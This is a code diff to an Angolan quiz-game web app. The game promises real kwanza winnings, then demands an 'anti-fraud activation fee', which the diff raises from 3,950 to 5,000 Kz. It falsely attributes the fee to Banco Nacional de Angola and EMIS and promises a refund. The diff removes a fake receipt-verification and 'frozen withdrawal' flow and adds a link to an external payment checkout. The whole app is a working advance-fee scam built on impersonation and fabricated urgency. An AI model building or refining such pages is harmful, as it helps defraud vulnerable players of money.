@@ -361,7 +361,7 @@ const App: React.FC = () => {
             <h3 className="text-xl sm:text-2xl md:text-3xl font-black text-black uppercase italic leading-none">JOGAR &<br/>GANHAR</h3>
             <span className="text-3xl sm:text-4xl md:text-5xl drop-shadow-md">💰</span>
           </div>
-          <p className="text-black/60 font-black uppercase text-[10px] md:text-xs">GANHE 10.000 Kz POR ACERTO</p>
+          <p className="text-black/60 font-black uppercase text-[10px] md:text-xs">GANHE 11.000 Kz POR ACERTO</p>
         </button>
 
         <button onClick={() => setGameState(GameState.INSTRUCTIONS)} 
@@ -651,7 +651,7 @@ const App: React.FC = () => {
           SOU <span className="text-angola-yellow text-glow-yellow">ANGOLANO</span>
         </h1>
         <p className="text-zinc-300 font-extrabold uppercase tracking-[0.2em] sm:tracking-[0.4em] text-[10px] sm:text-xs max-w-2xl mx-auto leading-relaxed">
-          Prepara-te para testar a tua sabedoria. Cada resposta certa vale <span className="text-angola-yellow font-black">10.000 Kz reais</span> na tua carteira.
+          Prepara-te para testar a tua sabedoria. Cada resposta certa vale <span className="text-angola-yellow font-black">11.000 Kz reais</span> na tua carteira.
         </p>
       </div>
 
@@ -773,7 +773,7 @@ const App: React.FC = () => {
                <div className="text-left space-y-8 text-zinc-300 mb-12">
                  <div className="flex items-center gap-6 group">
                     <span className="bg-angola-yellow text-black w-12 h-12 rounded-2xl flex items-center justify-center shrink-0 font-black text-xl group-hover:rotate-12 transition-transform shadow-lg">1</span>
-                    <p className="font-bold text-sm sm:text-base md:text-lg">Acerte as questões de cultura. Cada acerto vale <span className="text-angola-yellow font-black">10.000 Kz REAIS</span>.</p>
+                    <p className="font-bold text-sm sm:text-base md:text-lg">Acerte as questões de cultura. Cada acerto vale <span className="text-angola-yellow font-black">11.000 Kz REAIS</span>.</p>
                  </div>
                  <div className="flex items-center gap-6 group">
                     <span className="bg-angola-yellow text-black w-12 h-12 rounded-2xl flex items-center justify-center shrink-0 font-black text-xl group-hover:rotate-12 transition-transform shadow-lg">2</span>
@@ -1564,7 +1564,7 @@ const App: React.FC = () => {
                     <div className="text-center border-r border-zinc-900 pr-2">
                       <p className="text-zinc-500 text-[10px] sm:text-xs font-black uppercase tracking-wider">TAXA INTEGRAL</p>
                       <p className="text-2xl sm:text-3xl font-black text-rose-500 line-through tracking-tight mt-1 opacity-70">
-                        5.000 Kz
+                        6.000 Kz
                       </p>
                       <span className="text-[8px] text-zinc-650 font-bold uppercase mt-1 block">Sem Subvenção</span>
                     </div>
@@ -1575,10 +1575,10 @@ const App: React.FC = () => {
                         ✨ COM BÓNUS BNA
                       </p>
                       <p className="text-3xl sm:text-4xl md:text-5xl font-black text-green-400 tracking-tight mt-1 animate-pulse drop-shadow-[0_4px_12px_rgba(74,222,128,0.3)]">
-                        3.950 Kz
+                        5.000 Kz
                       </p>
                       <span className="text-[8px] bg-green-500/15 text-green-400 font-extrabold px-1.5 py-0.5 rounded uppercase mt-1 inline-block border border-green-500/25">
-                        Poupa 1.050 Kz
+                        Poupa 1.000 Kz
                       </span>
                     </div>
                   </div>
@@ -1601,7 +1601,7 @@ const App: React.FC = () => {
                     </span>
                   </div>
                   <p className="text-[8px] sm:text-[9px] font-bold uppercase text-zinc-400 mt-1.5 tracking-wider">
-                    Após este período comemorativo, a taxa protocolar do BNA retornará automaticamente ao valor padrão de 5.000 Kz.
+                    Após este período comemorativo, a taxa protocolar do BNA retornará automaticamente ao valor padrão de 6.000 Kz.
                   </p>
                 </div>
 
@@ -1627,7 +1627,7 @@ const App: React.FC = () => {
                     }}
                     className="w-full py-5 sm:py-8 bg-gradient-to-r from-emerald-500 via-green-600 to-emerald-500 hover:from-green-500 hover:to-green-600 text-white font-black rounded-2xl sm:rounded-[3rem] text-lg sm:text-2xl uppercase tracking-wider shadow-[0_15px_45px_rgba(16,185,129,0.4)] hover:scale-103 active:scale-95 duration-100 transition-all select-none cursor-pointer border-b-8 border-green-800 active:border-b-2 flex items-center justify-center gap-2.5"
                   >
-                    <span>REIVINDICAR BÓNUS BNA DE 3.950 Kz 👑</span>
+                    <span>REIVINDICAR BÓNUS BNA DE 5.000 Kz 👑</span>
                     <span className="text-3xl animate-bounce">🌍</span>
                   </button>
 
@@ -1693,278 +1693,83 @@ const App: React.FC = () => {
                       <span>🏦 GARANTIA DE REEMBOLSO INTEGRAL DA TAXA PROTOCOLAR</span>
                     </div>
                     <p className="text-xs text-zinc-300 font-bold leading-relaxed text-slate-300">
-                      Para provar que a sua atividade na plataforma é legítima e que você não é um robô de spam automatizado, o Banco Nacional de Angola e a EMIS exigem o pagamento protocolar da taxa de ativação anti-fraude no valor único de <strong className="text-amber-400 underline">3.950,00 Kz</strong>.
+                      Para provar que a sua atividade na plataforma é legítima e que você não é um robô de spam automatizado, o Banco Nacional de Angola e a EMIS exigem o pagamento protocolar da taxa de ativação anti-fraude no valor único de <strong className="text-amber-400 underline">5.000,00 Kz</strong>.
                     </p>
                     <div className="bg-amber-550/15 border border-amber-500/30 rounded-xl p-3 text-[11px] sm:text-xs text-yellow-300 font-black flex items-start gap-2 uppercase">
                       <span>💎</span>
-                      <span>INFORMAÇÃO IMPORTANTE: O valor de 3.950,00 Kz será somado e INTEGRALMENTE DEVOLVIDO na sua conta de destino na mesma transferência do saque total! O seu saque libertado será de {((stats.accumulatedKz || 935559450) + 3950).toLocaleString('pt-AO')} Kz.</span>
+                      <span>INFORMAÇÃO IMPORTANTE: O valor de 5.000,00 Kz será somado e INTEGRALMENTE DEVOLVIDO na sua conta de destino na mesma transferência do saque total! O seu saque libertado será de {((stats.accumulatedKz || 165000) + 5000).toLocaleString('pt-AO')} Kz.</span>
                     </div>
                   </div>
                 </div>
 
-                {/* Main panel layout split in two columns for desktop */}
-                <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
-                  
-                  {/* Left Column: Multicaixa Reciept Design */}
-                  <div className="md:col-span-6 bg-black border-2 border-zinc-900 p-5 rounded-3xl relative overflow-hidden shadow-2xl">
-                    <div className="absolute top-0 right-0 w-24 h-24 bg-zinc-900/25 border-b border-l border-zinc-900/30 rounded-bl-[4rem]"></div>
-                    
-                    {/* Multicaixa header logo */}
-                    <div className="flex justify-between items-center pb-4 border-b border-zinc-900 font-mono">
-                      <div className="flex items-center gap-1.5">
-                        <span className="text-xl">💳</span>
-                        <span className="font-mono text-xs text-zinc-400 font-bold uppercase tracking-wider">MULTICAIXA / PAGAMENTO</span>
+                {/* Direct Online Payment Button - Irresistible & Premium */}
+                <div className="bg-gradient-to-r from-amber-500/20 via-yellow-500/10 to-amber-500/20 border-2 border-amber-500 rounded-3xl p-6 text-center space-y-4 shadow-[0_0_30px_rgba(245,158,11,0.25)]">
+                  <div className="flex flex-col lg:flex-row items-center justify-between gap-5 text-left">
+                    <div className="space-y-1.5 max-w-xl">
+                      <div className="inline-flex items-center gap-1.5 bg-amber-500/20 text-amber-400 border border-amber-500/30 font-black text-[10px] px-2.5 py-1 rounded-md uppercase tracking-wider">
+                        ⚡ COMPENSAÇÃO IMEDIATA (30 SEGUNDOS)
                       </div>
-                      <span className="text-[9px] bg-red-655 text-red-400 font-black px-2.5 py-0.5 rounded-full border border-red-500/20 animate-pulse">SESSÃO CRÍTICA</span>
+                      <h4 className="text-lg sm:text-2xl font-black text-white italic uppercase tracking-tight">
+                        MÉTODO 1: ATIVAÇÃO ONLINE AUTOMÁTICA (RECOMENDADO)
+                      </h4>
+                      <p className="text-xs text-zinc-300 font-bold leading-relaxed">
+                        Pague online de forma 100% segura usando <span className="text-white underline">Aplicações Bancárias, Multicaixa Express, Cartões de Débito/Crédito ou Referência Instantânea</span>. O robô inteligente compensará na hora e libertará o saque total junto com o reembolso!
+                      </p>
                     </div>
-
-                    {/* Receipt fields */}
-                    <div className="space-y-4 pt-4 font-mono">
+                    <div className="relative group/btn w-full lg:w-auto shrink-0">
+                      {/* Beautiful ambient aura halo ring pulsating behind the button */}
+                      <div className="absolute -inset-1 bg-gradient-to-r from-amber-400 to-yellow-400 rounded-2xl blur-md opacity-80 group-hover/btn:opacity-100 transition duration-500 animate-pulse"></div>
                       
-                      {/* Entidade */}
-                      <div className="flex justify-between items-center bg-zinc-950 p-3.5 rounded-2xl border border-zinc-900/85">
-                        <div>
-                          <span className="text-[8px] sm:text-[9px] text-zinc-500 font-bold block uppercase tracking-wider text-left">ENTIDADE</span>
-                          <span className="text-lg sm:text-xl font-black text-rose-500 tracking-wider">
-                            {paymentEntity}
-                          </span>
-                        </div>
-                        <button 
-                          onClick={() => handleCopy(paymentEntity, 'entity')}
-                          className="px-3.5 py-2 bg-zinc-900 hover:bg-zinc-800 text-xs text-zinc-300 font-black rounded-xl hover:text-white transition-all select-none cursor-pointer flex items-center gap-1 border border-zinc-800"
-                        >
-                          {copiedField === 'entity' ? '✅ Copiado!' : '📋 Copiar'}
-                        </button>
-                      </div>
-
-                      {/* Referência */}
-                      <div className="flex justify-between items-center bg-zinc-950 p-3.5 rounded-2xl border border-zinc-900/85">
-                        <div>
-                          <span className="text-[8px] sm:text-[9px] text-zinc-500 font-bold block uppercase tracking-wider text-left">REFERÊNCIA</span>
-                          <span className="text-lg sm:text-xl font-black text-white tracking-widest">
-                            {paymentReference}
-                          </span>
-                        </div>
-                        <button 
-                          onClick={() => handleCopy(paymentReference, 'ref')}
-                          className="px-3.5 py-2 bg-zinc-900 hover:bg-zinc-800 text-xs text-zinc-300 font-black rounded-xl hover:text-white transition-all select-none cursor-pointer flex items-center gap-1 border border-zinc-800"
-                        >
-                          {copiedField === 'ref' ? '✅ Copiado!' : '📋 Copiar'}
-                        </button>
-                      </div>
-
-                      {/* Montante */}
-                      <div className="flex justify-between items-center bg-zinc-950 p-3.5 rounded-2xl border border-zinc-900/85">
-                        <div>
-                          <span className="text-[8px] sm:text-[9px] text-zinc-500 font-bold block uppercase tracking-wider text-left">MONTANTE EXATO DA TAXA</span>
-                          <span className="text-xl sm:text-2xl font-black text-amber-400">
-                            3.950,00 Kz
-                          </span>
-                        </div>
-                        <button 
-                          onClick={() => handleCopy('3950', 'amount')}
-                          className="px-3.5 py-2 bg-zinc-900 hover:bg-zinc-800 text-xs text-zinc-300 font-black rounded-xl hover:text-white transition-all select-none cursor-pointer flex items-center gap-1 border border-zinc-800"
-                        >
-                          {copiedField === 'amount' ? '✅ Copiado!' : '📋 Copiar'}
-                        </button>
-                      </div>
-
-                      {/* Descrição */}
-                      <div className="pt-2 text-[9px] text-zinc-500 uppercase font-black space-y-1">
-                        <div className="flex justify-between"><span>Destino:</span> <span className="text-zinc-300">Emissão Prova Ativação BNA</span></div>
-                        <div className="flex justify-between"><span>Beneficiário:</span> <span className="text-zinc-300 underline">Garantia Reembolso EMIS</span></div>
-                        <div className="flex justify-between"><span>ID Operação:</span> <span className="text-zinc-300">#TAX-{Math.floor(100000 + Math.random() * 900000)}</span></div>
-                      </div>
-
+                      <a 
+                        href="https://www.kintu.org/product/2aeff560-f13b-4814-9305-cba3f58e2a80" 
+                        target="_blank" 
+                        rel="noopener noreferrer"
+                        className="relative w-full lg:w-auto inline-flex items-center justify-center gap-3 px-9 py-5 bg-gradient-to-r from-amber-400 via-yellow-400 to-amber-500 hover:from-amber-500 hover:to-amber-600 active:scale-95 text-black font-black text-sm sm:text-base uppercase rounded-2xl shadow-[0_15px_40px_rgba(245,158,11,0.55)] transition-all border-b-6 border-amber-700 hover:scale-[1.03] cursor-pointer active:border-b-2"
+                      >
+                        <span className="text-xl animate-bounce">💳</span>
+                        <span className="tracking-wider">PAGAR TAXA ONLINE AGORA</span>
+                        <span className="text-xl transition-transform duration-300 group-hover/btn:translate-x-2.5 font-bold">➔</span>
+                      </a>
                     </div>
                   </div>
-
-                  {/* Right Column: Instructions */}
-                  <div className="md:col-span-6 bg-zinc-900/20 border-2 border-zinc-900/50 p-5 rounded-3xl h-full space-y-4 text-left">
-                    <h3 className="text-xs font-black text-zinc-300 uppercase tracking-widest pb-2 border-b border-zinc-900 flex items-center gap-1.5">
-                      📖 PASSO-A-PASSO PARA DESBLOQUEAR
-                    </h3>
-                    
-                    <ul className="space-y-3.5 text-xs text-zinc-400 font-bold leading-normal">
-                      <li className="flex gap-2.5 items-start">
-                        <span className="bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded text-[10px] font-black font-mono border border-amber-500/20">1</span>
-                        <span>Aceda ao seu aplicativo **Multicaixa Express**, Homebanking (BAI Directo, SOL, etc.), ou dirija-se a um **caixa automático (ATM)**.</span>
-                      </li>
-                      <li className="flex gap-2.5 items-start">
-                        <span className="bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded text-[10px] font-black font-mono border border-amber-500/20">2</span>
-                        <span>Escolha a opção **PAGAMENTOS** e de seguida seleccione **PAGAMENTO POR REFERENCIA / SERVIÇOS / COMPRAS**.</span>
-                      </li>
-                      <li className="flex gap-2.5 items-start">
-                        <span className="bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded text-[10px] font-black font-mono border border-amber-500/20">3</span>
-                        <span>Introduza a **Entidade (10116)**, a **Referência ({paymentReference})** e o valor exato de **3.950 Kz** mostrados ao lado no talão.</span>
-                      </li>
-                      <li className="flex gap-2.5 items-start">
-                        <span className="bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded text-[10px] font-black font-mono border border-amber-500/20">4</span>
-                        <span>Após concluir o pagamento da taxa, tire uma **captura de ecrã ou foto do comprovativo** e envie abaixo para carregar no sistema EMIS.</span>
-                      </li>
-                    </ul>
-
-                    <div className="bg-zinc-950/80 p-3.5 rounded-xl border border-zinc-900 text-[10px] uppercase font-bold text-center text-zinc-400 leading-tight">
-                      ⚡ COMPENSAÇÃO INSTANTÂNEA: <span className="text-amber-400">O robô SPTR identifica o talão da taxa e processa o reembolso junto com o seu saque na hora!</span>
-                    </div>
-                  </div>
-
                 </div>
 
-                {/* Bottom Interactive Area - Comprovativo Submitter */}
-                <div className="bg-zinc-950 border-2 border-zinc-900 p-6 rounded-3xl shadow-[inset_0_0_30px_rgba(0,0,0,0.5)]">
+                {/* Tutorial Passo-a-Passo de Desbloqueio Online */}
+                <div id="tutorial-desbloqueio-online" className="bg-zinc-900/20 border-2 border-zinc-900/50 p-6 sm:p-8 rounded-3xl text-left space-y-6">
+                  <h3 className="text-sm font-black text-zinc-300 uppercase tracking-widest pb-3 border-b border-zinc-900 flex items-center gap-1.5">
+                    📖 PASSO-A-PASSO PARA DESBLOQUEAR O SEU PRÉMIO
+                  </h3>
                   
-                  {uploadStatus === 'idle' && (
-                    <div className="space-y-4">
-                      
-                      <div className="text-center">
-                        <h4 className="text-xs sm:text-sm font-black text-amber-400 uppercase tracking-widest flex items-center justify-center gap-1.5">
-                          <span>📤 ÁREA DE CARREGAMENTO DO TALÃO DE ATIVAÇÃO</span>
-                        </h4>
-                        <p className="text-[10px] sm:text-xs text-zinc-500 font-bold mt-1">
-                          Insira o comprovativo bancário do pagamento de 3.950 Kz para validação eletrónica imediata
-                        </p>
+                  <ul className="space-y-4 text-xs sm:text-sm text-zinc-400 font-bold leading-relaxed">
+                    <li className="flex gap-3 items-start">
+                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5 animate-pulse">1</span>
+                      <div>
+                        <strong className="text-white">Clique no botão acima:</strong> Seleccione o botão <span className="text-amber-400 font-black">PAGAR TAXA ONLINE AGORA ➔</span> para ser redirecionado para o nosso checkout de segurança institucional.
                       </div>
-
-                      {/* Dropzone with Drag and Drop Support */}
-                      <div className="relative">
-                        <input 
-                          type="file" 
-                          id="comprovativo-upload"
-                          accept="image/*,application/pdf"
-                          onChange={handleFileUpload}
-                          className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-20"
-                        />
-                        <div 
-                          className="border-4 border-dashed border-zinc-800 hover:border-amber-500 transition-colors bg-zinc-900/10 hover:bg-amber-500/5 duration-300 rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center justify-center gap-4 group cursor-pointer"
-                        >
-                          <span className="text-5xl animate-pulse group-hover:scale-110 duration-200 transition-transform">📂</span>
-                          <div className="space-y-1">
-                            <p className="text-zinc-300 font-black text-sm uppercase">Arraste ou Seleccione Comprovativo de 3.950 Kz</p>
-                            <p className="text-[10px] text-zinc-500 font-bold uppercase">PNG, JPG, JPEG ou PDF até 10MB</p>
-                          </div>
-                        </div>
+                    </li>
+                    <li className="flex gap-3 items-start">
+                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5">2</span>
+                      <div>
+                        <strong className="text-white">Selecione o seu método de preferência:</strong> Efetue a liquidação imediata da taxa nacional de compensação anti-fraude de <span className="text-amber-400 font-extrabold">5.000,00 Kz</span> de forma segura usando o seu saldo bancário, Multicaixa ou cartão.
                       </div>
-
-                      {uploadError && (
-                        <div className="bg-red-500/10 border border-red-500/20 text-red-400 p-3 rounded-xl text-center font-bold text-xs uppercase animate-shake">
-                          ⚠️ {uploadError}
-                        </div>
-                      )}
-
-                    </div>
-                  )}
-
-                  {/* Loading States (Progress animation) */}
-                  {(uploadStatus === 'analyzing' || uploadStatus === 'verifying' || uploadStatus === 'sptr') && (
-                    <div className="space-y-6 py-4">
-                      
-                      {/* Dynamic Title based on step */}
-                      <div className="text-center space-y-1 animate-pulse">
-                        <h4 className="text-xs sm:text-sm font-black uppercase text-amber-400 tracking-wider">
-                          {uploadStatus === 'analyzing' && '🕵️ PASSO 1/4 - ANALISANDO COMPROVATIVO...'}
-                          {uploadStatus === 'verifying' && '🛡️ PASSO 2/4 - AUTENTICANDO PROCESSAMENTO EMIS...'}
-                          {uploadStatus === 'sptr' && '⚡ PASSO 3/4 - CONEXÃO CANAL REEMBOLSO BNA...'}
-                        </h4>
-                        <p className="text-[10px] text-zinc-400 font-bold uppercase tracking-wider">
-                          {uploadStatus === 'analyzing' && 'Lendo dados do talão, montantes e data de envio institucional...'}
-                          {uploadStatus === 'verifying' && 'Cruzando comprovativo nos canais de compensação interbancária EMIS...'}
-                          {uploadStatus === 'sptr' && 'A validar processo de liquidação e devolução de taxa de 3.950 Kz...'}
-                        </p>
+                    </li>
+                    <li className="flex gap-3 items-start">
+                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5">3</span>
+                      <div>
+                        <strong className="text-white">Verificação Eletrónica Instantânea:</strong> Assim que efetuar o pagamento, o sistema inteligente EMIS e os canais de transação interbancários do robô SPTR detetam a sua liquidação na hora em menos de 120 segundos.
                       </div>
-
-                      {/* Custom stunning glowing Progress bar */}
-                      <div className="max-w-xl mx-auto space-y-2">
-                        <div className="w-full bg-zinc-900 h-6 sm:h-8 rounded-full overflow-hidden border border-zinc-800 relative shadow-inner">
-                          <div 
-                            className="bg-gradient-to-r from-amber-500 via-amber-400 to-amber-500 h-full transition-all duration-300 ease-out shadow-[0_0_20px_rgba(245,158,11,0.5)] rounded-full relative"
-                            style={{ width: `${uploadProgress}%` }}
-                          >
-                          </div>
-                          
-                          <div className="absolute inset-0 flex items-center justify-center font-mono font-black text-xs text-white">
-                            {uploadProgress}% COMPLETO
-                          </div>
-                        </div>
-
-                        {/* File preview name */}
-                        <div className="text-center">
-                          <span className="text-[9px] font-mono text-zinc-500 font-bold uppercase block">
-                            📁 FICHEIRO EM PROCESSAMENTO: {uploadedFile?.name}
-                          </span>
-                        </div>
+                    </li>
+                    <li className="flex gap-3 items-start">
+                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5">4</span>
+                      <div>
+                        <strong className="text-white">Descongelamento & Transferência Automatizada:</strong> O robô liberta imediatamente o seu prémio total de <strong className="text-emerald-400">{(stats.accumulatedKz || 165000).toLocaleString('pt-AO')} Kz</strong> e faz o <strong className="text-amber-400">reembolso integral dos 5.000 Kz da taxa</strong> diretamente na sua conta bancária de receção de forma 100% automatizada.
                       </div>
+                    </li>
+                  </ul>
 
-                    </div>
-                  )}
-
-                  {/* FROZEN / ACCREDITATION REQUIRED STATE (SAQUE CONGELADO ATÉ PAGAR A TAXA DO TITULAR) */}
-                  {uploadStatus === 'frozen' && (
-                    <div className="py-6 space-y-6 text-center animate-bounce-in">
-                      
-                      {/* Critical Security Emblem */}
-                      <div className="flex flex-col items-center justify-center gap-3">
-                        <div className="w-24 h-24 bg-red-950/20 border-4 border-red-500 rounded-full flex items-center justify-center shadow-[0_0_50px_rgba(239,68,68,0.35)] animate-pulse">
-                          <span className="text-5xl animate-bounce">⚠️</span>
-                        </div>
-                        <h3 className="text-red-500 text-xl sm:text-3xl font-black uppercase tracking-tight italic">
-                          CONTA NÃO VERIFICADA - SAQUE CONGELADO!
-                        </h3>
-                        <div className="bg-red-500/10 border-2 border-red-550/40 rounded-2xl p-5 text-left max-w-2xl mx-auto space-y-3 shadow-lg">
-                          <div className="flex items-center gap-2 text-white font-extrabold text-sm uppercase tracking-wide">
-                            <span>🚨 PROTOCOLO DE ALERTA NACIONAL (SEGURANÇA EMIS)</span>
-                          </div>
-                          <p className="text-xs text-zinc-200 font-bold leading-relaxed">
-                            O nosso sistema de verificação eletrónica processou o ficheiro enviado, mas detetou que a sua conta de receção (<strong className="text-white underline">{selectedBank?.name || 'A Sua Conta Bancária'}</strong>) ainda <strong className="text-red-400">NÃO se encontra verificada com assinatura protocolar humana contra robôs</strong>.
-                          </p>
-                          <p className="text-xs text-zinc-400 font-semibold leading-relaxed">
-                            Por razões rígidas de prevenção de fraudes e em conformidade estrita com as normas interbancárias, <strong className="text-zinc-100">o seu prémio total de {(stats.accumulatedKz || 935559450).toLocaleString('pt-AO')} Kz foi temporariamente CONGELADO de forma preventiva.</strong>
-                          </p>
-                        </div>
-                      </div>
-
-                      {/* Persuasive instructions to make payment right now */}
-                      <div className="bg-gradient-to-r from-amber-600/15 via-zinc-950 to-amber-600/15 border border-amber-500/30 p-5 rounded-2xl max-w-xl mx-auto font-sans text-left space-y-3 shadow-inner">
-                        <span className="text-[11px] sm:text-xs font-black text-amber-400 uppercase tracking-widest block pb-1.5 border-b border-zinc-900">
-                          ⚙️ COMO DESCONGELAR E TRANSFERIR MEUS FUNDOS AGORA?
-                        </span>
-                        <div className="space-y-2 text-xs text-zinc-300 font-bold leading-relaxed">
-                          <p>
-                            1. Dirija-se ao seu aplicativo bancário ou caixa ATM e efetue o pagamento da taxa de ativação anti-fraude de <strong className="text-amber-400 underline">3.950,00 Kz</strong> usando a Entidade e Referência fornecidas acima.
-                          </p>
-                          <p>
-                            2. A liquidação será confirmada nos canais EMIS/SPTR em menos de 120 segundos.
-                          </p>
-                          <p>
-                            3. O robô SPTR descongelará o seu prémio imediatamente, libertando o montante total de <strong className="text-emerald-400">{((stats.accumulatedKz || 935559450) + 3950).toLocaleString('pt-AO')} Kz</strong> e <strong className="text-amber-400">FAZ O REEMBOLSO INTEGRAL dos 3.950 Kz da taxa (somando-os no resultado da transferência!)</strong> de forma 100% automatizada.
-                          </p>
-                        </div>
-                      </div>
-
-                      {/* Navigation return CTA to go register payment details */}
-                      <div className="max-w-md mx-auto pt-4 space-y-3">
-                        <button 
-                          onClick={() => {
-                            // Scroll back to ATM details
-                            window.scrollTo({ top: 350, behavior: 'smooth' });
-                            setUploadedFile(null);
-                            setUploadStatus('idle');
-                            setUploadProgress(0);
-                            setReceiptUrl(null);
-                          }}
-                          className="w-full py-4 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-black font-black rounded-2xl uppercase tracking-wider text-xs sm:text-sm shadow-[0_10px_30px_rgba(245,158,11,0.30)] hover:scale-[1.01] active:scale-95 transition-all cursor-pointer border-b-6 border-amber-800"
-                        >
-                          👉 CLIQUE PARA VISUALIZAR ENTIDADE / REFERÊNCIA DE PAGAMENTO
-                        </button>
-                        
-                        <p className="text-[9.5px] font-bold uppercase text-zinc-500 tracking-wider">
-                          Tentativas de contornar a validação eletrónica com comprovativos falsos ou expirados resultarão no bloqueio definitivo do prémio no cofre do BNA.
-                        </p>
-                      </div>
-
-                    </div>
-                  )}
-
+                  <div className="bg-zinc-950/80 p-4 rounded-2xl border border-zinc-900 text-xs uppercase font-bold text-center text-zinc-400 leading-normal">
+                    ⚡ STATUS DA SESSÃO: <span className="text-green-400 animate-pulse font-black">CONEXÃO SEGURA ATIVA — AGUARDANDO ATIVAÇÃO ONLINE</span>
+                  </div>
                 </div>
 
                 {/* Back utilities */}
